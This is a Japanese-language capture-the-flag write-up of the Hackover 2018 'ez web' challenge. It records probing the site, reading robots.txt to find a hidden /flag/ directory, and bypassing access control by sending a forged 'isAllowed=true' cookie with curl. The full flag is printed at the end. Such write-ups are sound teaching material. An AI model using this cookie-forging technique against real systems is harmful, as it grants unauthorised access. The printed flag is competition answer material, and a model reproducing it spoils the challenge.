# ez web[Web]
```
Easy web challenge in the slimmest possible design.... namely none.

http://ez-web.ctf.hackover.de:8080
```
# do
- 手掛かりがない。アクセスすると
```
<!DOCTYPE html>
	<head>
		<title>Under Construction</title>
	</head>
	<body>
		<p><img src='/under_construction.gif' alt='under construction' /></p>
	</body>
</html>
```
- これしかない。altは説明文だから意味ない？

```
<html><body><h1>Whitelabel Error Page</h1><p>This application has no explicit mapping for /error, so you are seeing this as a fallback.</p><div id='created'>Sat Oct 06 06:48:43 GMT 2018</div><div>There was an unexpected error (type=Not Found, status=404).</div><div>No message available</div></body></html>
```
- /construcion, /under, /under_construction すべて上のように404が返ってくる。
- under constructionは工事中という意味。
- curlでGET, POST, PUT, DELETEを飛ばしても404
- [st98さんのブログ](https://st98.github.io/diary/posts/2017-09-18-sec-t-ctf-2017.html)
- robots.txtにアクセス→`User-agent: * Disallow: /flag/`
- `http://ez-web.ctf.hackover.de:8080/flag/`
```
<!DOCTYPE html>
	<head>
		<title>Flag Listing</title>
	</head>
	<body>
		<p><a href='flag.txt'>flag.txt</a></p>
	</body>
</html>
```
- `http://ez-web.ctf.hackover.de:8080/flag/flag.txt`
```
<!DOCTYPE html>
	<head>
		<title>Restricted Access</title>
	</head>
	<body>
		<p>You do not have permission to enter this Area. A mail has been sent to our Admins.<br/>You shall be arrested shortly.</p>
	</body>
</html>
```
- http://ez-web.ctf.hackover.de:8080/flag/flag.txt のnetwork見てると`Cookie: isAllowed=false`これは！！！いけるかも
- curl にcookieを設定するといけた
```
vagrant@vagrant:~$ curl -i -H 'Cookie: isAllowed=true' http://ez-web.ctf.hackover.de:8080/flag/flag.txt
HTTP/1.1 200
Content-Type: text/plain;charset=UTF-8
Content-Length: 142
Date: Sat, 06 Oct 2018 22:29:13 GMT

<!DOCTYPE html>
        <head>
                <title>Well done!</title>
        </head>
        <body>
                <p>hackover18{W3llD0n3,K1d.Th4tSh0tw4s1InAM1ll10n}</p>
        </body>
</html>
```